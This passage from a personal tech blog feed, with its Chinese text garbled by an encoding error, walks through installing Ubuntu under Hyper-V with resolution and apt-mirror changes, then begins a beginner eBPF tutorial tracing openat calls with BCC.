alt="image-20220725165812170"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725165856177.png" alt="image-20220725165856177"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725165936840.png" alt="image-20220725165936840"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725170507477.png" alt="image-20220725170507477"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725170541316.png" alt="image-20220725170541316"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725170629907.png" alt="image-20220725170629907"></p><p>è¿™ä¸€å—ä¸æ•¢ç‚¹å‘€ä¸æ•¢ç‚¹ï¼Œå°±å®³æ€•æŠŠè‡ªå·±windowsçš„ç¡¬ç›˜æ ¼å¼åŒ–äº†</p><p>ä»ç½‘ä¸ŠæŸ¥äº†å¥½å¤šï¼Œéƒ½è¯´æ²¡äº‹çš„</p><p>ç»ˆäºé¡¶ç€ä¸€é¢—æ‚¬ç€çš„å¿ƒç‚¹äº†ä¸‹å»</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725170709688.png" alt="image-20220725170709688"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725171844768.png" alt="image-20220725171844768"></p><p>å¯ä»¥è¾“å…¥â€œShanghaiâ€</p><p>ä¹Ÿå¯ä»¥ç‚¹å‡»åœ°å›¾ä¸­çš„ä½ç½®</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725172016759.png" alt="image-20220725172016759"></p><p>ç‚¹å‡»â€œ restartâ€</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725172923147.png" alt="image-20220725172923147"></p><p>ç‚¹å‡»â€œenterâ€</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725173115871.png" alt="image-20220725173115871"></p><p>è¿™ä¸ªçœŸçš„æ˜¯å“æ­»æˆ‘äº†</p><h2 id="ä¼˜åŒ–"><a href="#ä¼˜åŒ–" class="headerlink" title="ä¼˜åŒ–"></a>ä¼˜åŒ–</h2><p>é»˜è®¤æ˜¾ç¤ºå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725174238658.png" alt="image-20220725174238658"></p><h3 id="è°ƒæ•´è™šæ‹Ÿæœºçš„åˆ†è¾¨ç‡ä¸æ€§èƒ½"><a href="#è°ƒæ•´è™šæ‹Ÿæœºçš„åˆ†è¾¨ç‡ä¸æ€§èƒ½" class="headerlink" title="è°ƒæ•´è™šæ‹Ÿæœºçš„åˆ†è¾¨ç‡ä¸æ€§èƒ½"></a>è°ƒæ•´è™šæ‹Ÿæœºçš„åˆ†è¾¨ç‡ä¸æ€§èƒ½</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒHyper-Vä¸‹çš„ Ubuntu æ¡Œé¢çš„åˆ†è¾¨ä¸å¤Ÿç†æƒ³ï¼Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨è°ƒæ•´ï¼Œè¯·åœ¨ Ubuntu æ¡Œé¢ä¸Šå³é”®ï¼Œåœ¨èœå•ä¸­é€‰æ‹© â€œOpen in Terminalâ€ï¼Œ åœ¨æ‰“å¼€çš„Terminalç»ˆç«¯çª—å£ä¸­è¾“å…¥ä»¥ä¸‹æŒ‡ä»¤ï¼š</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo gedit <span class="hljs-regexp">/etc/</span><span class="hljs-keyword">default</span>/grub<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œç³»ç»Ÿä¼šæ‰“å¼€ä¸€ä¸ªæ–‡æœ¬ç¼–è¾‘å™¨ï¼Œè¯·åœ¨å½“å‰æ–‡ä»¶ä¸­å¯»æ‰¾åˆ° GRUB_CMDLINE_LINUX_DEFAULT æ‰€åœ¨è¡Œï¼Œåœ¨æœ€ååŠ ä¸Š video&#x3D;hyperv_fb:[1920x1080]ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725174647281.png" alt="image-20220725174647281"></p><p>ä¿å­˜ä¸Šè¿°æ–‡ä»¶åé€€å‡ºæ–‡æœ¬ç¼–è¾‘å™¨ï¼Œåœ¨ Terminal ç»ˆç«¯çª—å£ä¸­è¾“å…¥ä»¥ä¸‹æŒ‡ä»¤ï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo update-grub</span><br></code></pre></td></tr></table></figure><p>æœ€åï¼Œè¯·é‡æ–°å¯åŠ¨ Ubuntu è™šæ‹Ÿæœºï¼Œé‡æ–°ç™»å½•åçš„ Ubuntu æ¡Œé¢ï¼Œå…¶åˆ†è¾¨ç‡å°†è®¾ç½®ä¸ºæ‚¨åˆšæ‰æŒ‡å®šçš„å¤§å°ã€‚</p><h2 id="åˆ›å»ºå¤±è´¥"><a href="#åˆ›å»ºå¤±è´¥" class="headerlink" title="åˆ›å»ºå¤±è´¥"></a>åˆ›å»ºå¤±è´¥</h2><h3 id="å¤±è´¥ä¾‹å­1"><a href="#å¤±è´¥ä¾‹å­1" class="headerlink" title="å¤±è´¥ä¾‹å­1"></a>å¤±è´¥ä¾‹å­1</h3><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725135724492.png" alt="image-20220725135724492"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725133331911.png" alt="image-20220725133331911"></p><h3 id="å¤±è´¥ä¾‹å­2"><a href="#å¤±è´¥ä¾‹å­2" class="headerlink" title="å¤±è´¥ä¾‹å­2"></a>å¤±è´¥ä¾‹å­2</h3><p>é€‰æ‹©ç¬¬äºŒä»£</p><p>å®‰å…¨å¯åŠ¨é‚£å—é€‰äº†å¾®è½¯çš„é‚£ä¸ªé€‰é¡¹</p><p>ä¹ŸæŠ¥é”™äº†ï¼Œæ²¡æœ‰æˆåŠŸ</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725133331911.png" alt="image-20220725133331911"></p><h2 id="hyperæ“ä½œ"><a href="#hyperæ“ä½œ" class="headerlink" title="hyperæ“ä½œ"></a>hyperæ“ä½œ</h2><h3 id="ä»-Hyper-V-ç®¡ç†å™¨é‡å¯æœåŠ¡"><a href="#ä»-Hyper-V-ç®¡ç†å™¨é‡å¯æœåŠ¡" class="headerlink" title="ä» Hyper-V ç®¡ç†å™¨é‡å¯æœåŠ¡"></a>ä» Hyper-V ç®¡ç†å™¨é‡å¯æœåŠ¡</h3><ol><li>æ‰“å¼€ Hyper-V ç®¡ç†å™¨ã€‚ å•å‡»<strong>â€œå¼€å§‹â€</strong>ï¼ŒæŒ‡å‘<strong>â€œç®¡ç†å·¥å…·â€</strong>ï¼Œç„¶åå•å‡»<strong>â€œHyper-V ç®¡ç†å™¨â€</strong>ã€‚</li><li>åœ¨å¯¼èˆªçª—æ ¼ä¸­ï¼Œå•å‡»æœåŠ¡å™¨çš„åç§°ï¼ˆå¦‚æœå°šæœªé€‰æ‹©ï¼‰ã€‚</li><li>åœ¨â€ <strong>æ“ä½œâ€çª—æ ¼ä¸­</strong> ï¼Œå•å‡»â€ **å¯åŠ¨æœåŠ¡â€**ã€‚</li></ol><h2 id="ubuntu20-10æ›´æ¢æº"><a href="#ubuntu20-10æ›´æ¢æº" class="headerlink" title="ubuntu20.10æ›´æ¢æº"></a>ubuntu20.10æ›´æ¢æº</h2><p>Ubuntu çš„è½¯ä»¶æºé…ç½®æ–‡ä»¶æ˜¯ &#x2F;etc&#x2F;apt&#x2F;sources.listã€‚å°†ç³»ç»Ÿè‡ªå¸¦çš„è¯¥æ–‡ä»¶åšä¸ªå¤‡ä»½ï¼Œå°†è¯¥æ–‡ä»¶æ›¿æ¢ä¸ºä¸‹é¢å†…å®¹ï¼Œå³å¯ä½¿ç”¨å›½å†…çš„è½¯ä»¶æºé•œåƒã€‚<br>ä¸€å®šè¦å¤‡ä»½ï¼Œä¸€å®šè¦å¤‡ä»½ï¼Œä¸€å®šè¦å¤‡ä»½ï¼Œé‡è¦çš„äº‹æƒ…è¯´ä¸‰éã€‚</p><p>1.å¤‡ä»½åŸå§‹æºæ–‡ä»¶source.list<br>sudo  cp   &#x2F;etc&#x2F;apt&#x2F;sources.list   &#x2F;etc&#x2F;apt&#x2F;sources.list.bak</p><p>2.ä¿®æ”¹æºæ–‡ä»¶sources.list</p><p>åˆ é™¤åŸæ¥çš„æ–‡ä»¶å†…å®¹ï¼Œå¤åˆ¶ä¸‹é¢çš„å®˜æ–¹æºåˆ°å…¶ä¸­å¹¶ä¿å­˜</p><p> <a href="https://mirrors.ustc.edu.cn/repogen/">ä¸­ç§‘å¤§å®˜ç½‘</a></p><p>ä¸‹é¢æ˜¯ä¸­ç§‘å¤§ ubuntu20.10çš„æº</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk">deb https:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/ubuntu-old-releases/u</span>buntu/ groovy main restricted universe multiverse<br>deb-src https:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/ubuntu-old-releases/u</span>buntu/ groovy main restricted universe multiverse<br><br>deb https:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/ubuntu-old-releases/u</span>buntu/ groovy-security main restricted universe multiverse<br>deb-src https:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/ubuntu-old-releases/u</span>buntu/ groovy-security main restricted universe multiverse<br><br>deb https:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/ubuntu-old-releases/u</span>buntu/ groovy-updates main restricted universe multiverse<br>deb-src https:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/ubuntu-old-releases/u</span>buntu/ groovy-updates main restricted universe multiverse<br><br>deb https:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/ubuntu-old-releases/u</span>buntu/ groovy-backports main restricted universe multiverse<br>deb-src https:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/ubuntu-old-releases/u</span>buntu/ groovy-backports main restricted universe multiverse<br><br><span class="hljs-comment">## Not recommended</span><br><span class="hljs-comment"># deb https://mirrors.ustc.edu.cn/ubuntu-old-releases/ubuntu/ groovy-proposed main restricted universe multiverse</span><br><span class="hljs-comment"># deb-src https://mirrors.ustc.edu.cn/ubuntu-old-releases/ubuntu/ groovy-proposed main restricted universe multiverse</span><br></code></pre></td></tr></table></figure><p>3.æ›´æ–°æº<br>æ¡Œé¢ç»ˆç«¯æ‰§è¡Œå‘½ä»¤ï¼šsudo apt updateæ›´æ–°è½¯ä»¶åˆ—è¡¨ï¼Œæ¢æºå®Œæˆã€‚</p><h1 id="â€”â€”â€”â€”â€”â€“-2022-08-14-â€”â€”â€”â€”â€”â€“"><a href="#â€”â€”â€”â€”â€”â€“-2022-08-14-â€”â€”â€”â€”â€”â€“" class="headerlink" title="â€”â€”â€”â€”â€”â€“ 2022.08.14 â€”â€”â€”â€”â€”â€“"></a>â€”â€”â€”â€”â€”â€“ 2022.08.14 â€”â€”â€”â€”â€”â€“</h1><h2 id="ubuntu18-04-6"><a href="#ubuntu18-04-6" class="headerlink" title="ubuntu18.04.6"></a>ubuntu18.04.6</h2><p><a href="https://releases.ubuntu.com/18.04.6/">ubuntu18.04.6é•œåƒä¸‹è½½</a></p><h3 id="æˆåŠŸå°è¯•"><a href="#æˆåŠŸå°è¯•" class="headerlink" title="æˆåŠŸå°è¯•"></a>æˆåŠŸå°è¯•</h3><p>æŒ‡å®šä»£æ•°ï¼šç¬¬ä¸€ä»£</p><p>å¯ç”¨å®‰å…¨å¯åŠ¨ï¼šå»æ‰æˆ–è€…ä¸å»æ‰éƒ½å¯ä»¥æˆåŠŸ</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220814214057058.png" alt="image-20220814214057058"></p><p>æ›´æ¢æºï¼š 18.04 é˜¿é‡Œ</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk">deb https:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> bionic main restricted universe multiverse<br>deb-src https:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> bionic main restricted universe multiverse<br><br>deb https:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> bionic-security main restricted universe multiverse<br>deb-src https:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> bionic-security main restricted universe multiverse<br><br>deb https:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> bionic-updates main restricted universe multiverse<br>deb-src https:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> bionic-updates main restricted universe multiverse<br><br><span class="hljs-comment"># deb https://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="hljs-comment"># deb-src https://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><br>deb https:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> bionic-backports main restricted universe multiverse<br>deb-src https:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> bionic-backports main restricted universe multiverse<br><br></code></pre></td></tr></table></figure><h3 id="å¤±è´¥å°è¯•"><a href="#å¤±è´¥å°è¯•" class="headerlink" title="å¤±è´¥å°è¯•"></a>å¤±è´¥å°è¯•</h3><p>æŒ‡å®šä»£æ•°ï¼šç¬¬äºŒä»£</p><p>å¯ç”¨å®‰å…¨å¯åŠ¨ï¼šå»æ‰</p><p>æŠ¥é”™ä¿¡æ¯ï¼šunable to find a medium containing a live file system</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/fedragon/article/details/117300451">win10 Hyper-Vå®‰è£…é…ç½®ubuntuè™šæ‹Ÿæœº</a> é‡è¦ å‚è€ƒâ€æ“ä½œæ­¥éª¤â€œ</p><p><a href="https://www.szdamai.com/help/app/ubuntuhyperv">åœ¨ Hyper-V ä¸­å®‰è£… Ubuntu ç³»ç»Ÿ</a> æ¬¡é‡è¦ å‚è€ƒâ€æ›´æ”¹åˆ†è¾¨ç‡â€œ</p><p><a href="https://docs.microsoft.com/zh-cn/windows-server/virtualization/hyper-v/best-practices-analyzer/the-hyper-v-virtual-machine-management-service-must-be-running">Hyper-V è™šæ‹Ÿæœºç®¡ç†æœåŠ¡å¿…é¡»æ­£åœ¨è¿è¡Œ</a></p><p><a href="https://blog.csdn.net/weixin_44302833/article/details/110132032">Ubuntu 20.10 groovy æ›´æ¢å›½å†…æº</a></p><p><a href="https://cloud.tencent.com/developer/article/1434564">ä¿®æ”¹Ubuntuæ“ä½œç³»ç»Ÿrooté»˜è®¤å¯†ç </a></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ebpfã€‘first try</title>
    <link href="/2022/07/25/ebpf/%E3%80%90ebpf%E3%80%91first%20try/"/>
    <url>/2022/07/25/ebpf/%E3%80%90ebpf%E3%80%91first%20try/</url>
    
    <content type="html"><![CDATA[<h1 id="03-åˆçª¥é—¨å¾„ï¼šå¼€å‘å¹¶è¿è¡Œä½ çš„ç¬¬ä¸€ä¸ª-eBPF-ç¨‹åº"><a href="#03-åˆçª¥é—¨å¾„ï¼šå¼€å‘å¹¶è¿è¡Œä½ çš„ç¬¬ä¸€ä¸ª-eBPF-ç¨‹åº" class="headerlink" title="03 | åˆçª¥é—¨å¾„ï¼šå¼€å‘å¹¶è¿è¡Œä½ çš„ç¬¬ä¸€ä¸ª eBPF ç¨‹åº"></a>03 | åˆçª¥é—¨å¾„ï¼šå¼€å‘å¹¶è¿è¡Œä½ çš„ç¬¬ä¸€ä¸ª eBPF ç¨‹åº</h1><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># uname -a</span><br>Linux ningan 5.13.0-51-generic <span class="hljs-comment">#58~20.04.1-Ubuntu SMP Tue Jun 14 11:29:12 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span><br><br>[root@ningan ebpf]<span class="hljs-comment"># sudo apt-get install -y  make clang llvm libelf-dev libbpf-dev bpfcc-tools libbpfcc-dev linux-tools-$(uname -r) linux-headers-$(uname -r)</span><br>Reading package lists... Done<br>Building dependency tree<br>Reading state information... Done<br>linux-headers-5.8.0-25-generic is already the newest version (5.8.0-25.26).<br>linux-tools-5.8.0-25-generic is already the newest version (5.8.0-25.26).<br>make is already the newest version (4.3-4ubuntu1).<br>bpfcc-tools is already the newest version (0.12.0-2).<br>clang is already the newest version (1:11.0-51~exp1).<br>libbpf-dev is already the newest version (1:0.1.0-1).<br>libbpfcc-dev is already the newest version (0.12.0-2).<br>llvm is already the newest version (1:11.0-51~exp1).<br>libelf-dev is already the newest version (0.181-1ubuntu0.1).<br>0 upgraded, 0 newly installed, 0 to remove and 147 not upgraded.<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726130910879.png" alt="image-20220726130910879"></p><h2 id="æ“ä½œæµç¨‹"><a href="#æ“ä½œæµç¨‹" class="headerlink" title="æ“ä½œæµç¨‹"></a>æ“ä½œæµç¨‹</h2><h3 id="å¼€å‘ç¬¬ä¸€ä¸ª-eBPF-ç¨‹åº"><a href="#å¼€å‘ç¬¬ä¸€ä¸ª-eBPF-ç¨‹åº" class="headerlink" title="å¼€å‘ç¬¬ä¸€ä¸ª eBPF ç¨‹åº"></a>å¼€å‘ç¬¬ä¸€ä¸ª eBPF ç¨‹åº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ebpf]<span class="hljs-comment"># cat hello.c</span><br><br>int hello_world(void *ctx)<br>&#123;<br>    bpf_trace_printk(<span class="hljs-string">&quot;Hello, World!&quot;</span>);<br>    <span class="hljs-built_in">return</span> 0;<br>&#125;<br><br><br><br><br>[root@ningan ebpf]<span class="hljs-comment"># cat hello.py</span><br><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># 1) import bcc library</span><br><span class="hljs-comment"># å¯¼å…¥äº† BCC  åº“çš„ BPF æ¨¡å—ï¼Œä»¥ä¾¿æ¥ä¸‹æ¥è°ƒç”¨ï¼›</span><br>from bcc import BPF<br><br><span class="hljs-comment"># 2) load BPF program</span><br><span class="hljs-comment"># è°ƒç”¨ BPF() åŠ è½½ç¬¬ä¸€æ­¥å¼€å‘çš„ BPF æºä»£ç ï¼›</span><br>b = BPF(src_file=<span class="hljs-string">&quot;hello.c&quot;</span>)<br><span class="hljs-comment"># 3) attach kprobe</span><br><span class="hljs-comment"># å°† BPF ç¨‹åºæŒ‚è½½åˆ°å†…æ ¸æ¢é’ˆï¼ˆç®€ç§° kprobeï¼‰ï¼Œå…¶ä¸­ do_sys_openat2() æ˜¯ç³»ç»Ÿè°ƒç”¨ openat() åœ¨å†…æ ¸ä¸­çš„å®ç°ï¼›</span><br>b.attach_kprobe(event=<span class="hljs-string">&quot;do_sys_openat2&quot;</span>, fn_name=<span class="hljs-string">&quot;hello_world&quot;</span>)<br><span class="hljs-comment"># 4) read and print /sys/kernel/debug/tracing/trace_pipe</span><br><span class="hljs-comment"># è¯»å–å†…æ ¸è°ƒè¯•æ–‡ä»¶ /sys/kernel/debug/tracing/trace_pipe çš„å†…å®¹ï¼Œå¹¶æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºä¸­ã€‚</span><br>b.trace_print()<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726132704120.png" alt="image-20220726132704120"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ebpf]<span class="hljs-comment"># cat /sys/kernel/debug/tracing/trace_options</span><br>print-parent<br>nosym-offset<br>nosym-addr<br>noverbose<br>noraw<br>nohex<br>nobin<br>noblock<br>trace_printk<br>annotate<br>nouserstacktrace<br>nosym-userobj<br>noprintk-msg-only<br>context-info<br>nolatency-format<br>record-cmd<br>norecord-tgid<br>overwrite<br>nodisable_on_free<br>irq-info<br>markers<br>noevent-fork<br>nopause-on-trace<br>function-trace<br>nofunction-fork<br>nodisplay-graph<br>nostacktrace<br>notest_nop_accept<br>notest_nop_refuse<br><br></code></pre></td></tr></table></figure><h3 id="æ”¹è¿›ç¬¬ä¸€ä¸ª-eBPF-ç¨‹åº"><a href="#æ”¹è¿›ç¬¬ä¸€ä¸ª-eBPF-ç¨‹åº" class="headerlink" title="æ”¹è¿›ç¬¬ä¸€ä¸ª eBPF ç¨‹åº"></a>æ”¹è¿›ç¬¬ä¸€ä¸ª eBPF ç¨‹åº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ebpf]<span class="hljs-comment"># cat trace-open.c</span><br><br>// åŒ…å«å¤´æ–‡ä»¶<br><span class="hljs-comment">#include &lt;uapi/linux/openat2.h&gt;</span><br><span class="hljs-comment">#include &lt;linux/sched.h&gt;</span><br><br>// å®šä¹‰æ•°æ®ç»“æ„<br>struct data_t &#123;<br>  u32 pid;<br>  u64 ts;<br>  char <span class="hljs-built_in">comm</span>[TASK_COMM_LEN];<br>  char fname[NAME_MAX];<br>&#125;;<br><br>// å®šä¹‰æ€§èƒ½äº‹ä»¶æ˜ å°„<br>BPF_PERF_OUTPUT(events);<br><br><br><br>// å®šä¹‰kprobeå¤„ç†å‡½æ•°<br>int hello_world(struct pt_regs *ctx, int dfd, const char __user * filename, struct open_how *how)<br>&#123;<br>  struct data_t data = &#123; &#125;;<br><br>  // è·å–PIDå’Œæ—¶é—´<br>  data.pid = bpf_get_current_pid_tgid();<br>  data.ts = bpf_ktime_get_ns();<br><br>  // è·å–è¿›ç¨‹å<br>  <span class="hljs-keyword">if</span> (bpf_get_current_comm(&amp;data.comm, sizeof(data.comm)) == 0)<br>  &#123;<br>    bpf_probe_read(&amp;data.fname, sizeof(data.fname), (void *)filename);<br>  &#125;<br><br>  // æäº¤æ€§èƒ½äº‹ä»¶<br>  events.perf_submit(ctx, &amp;data, sizeof(data));<br>  <span class="hljs-built_in">return</span> 0;<br>&#125;<br><br><br><br><br><br><br>[root@ningan ebpf]<span class="hljs-comment"># cat trace-open.py</span><br><br>from bcc import BPF<br><br><span class="hljs-comment"># 1) load BPF program</span><br><span class="hljs-comment"># åŠ è½½ eBPF ç¨‹åºå¹¶æŒ‚è½½åˆ°å†…æ ¸æ¢é’ˆä¸Š</span><br>b = BPF(src_file=<span class="hljs-string">&quot;trace-open.c&quot;</span>)<br>b.attach_kprobe(event=<span class="hljs-string">&quot;do_sys_openat2&quot;</span>, fn_name=<span class="hljs-string">&quot;hello_world&quot;</span>)<br><br><span class="hljs-comment"># 2) print header</span><br><span class="hljs-comment"># è¾“å‡ºä¸€è¡Œ Header å­—ç¬¦ä¸²è¡¨ç¤ºæ•°æ®çš„æ ¼å¼</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%-18s %-16s %-6s %-16s&quot;</span> % (<span class="hljs-string">&quot;TIME(s)&quot;</span>, <span class="hljs-string">&quot;COMM&quot;</span>, <span class="hljs-string">&quot;PID&quot;</span>, <span class="hljs-string">&quot;FILE&quot;</span>))<br><br><span class="hljs-comment"># 3) define the callback for perf event</span><br><span class="hljs-comment"># print_event å®šä¹‰ä¸€ä¸ªæ•°æ®å¤„ç†çš„å›è°ƒå‡½æ•°ï¼Œæ‰“å°è¿›ç¨‹çš„åå­—ã€PID ä»¥åŠå®ƒè°ƒç”¨ openat æ—¶æ‰“å¼€çš„æ–‡ä»¶</span><br>start = 0<br>def print_event(cpu, data, size):<br>    global start<br>    event = b[<span class="hljs-string">&quot;events&quot;</span>].event(data)<br>    <span class="hljs-keyword">if</span> start == 0:<br>            start = event.ts<br>    time_s = (<span class="hljs-built_in">float</span>(event.ts - start)) / 1000000000<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%-18.9f %-16s %-6d %-16s&quot;</span> % (time_s, event.comm, event.pid, event.fname))<br><br><span class="hljs-comment"># 4) loop with callback to print_event</span><br><span class="hljs-comment"># open_perf_buffer å®šä¹‰äº†åä¸º â€œeventsâ€ çš„ Perf äº‹ä»¶æ˜ å°„ï¼Œè€Œåé€šè¿‡ä¸€ä¸ªå¾ªç¯è°ƒç”¨ perf_buffer_poll 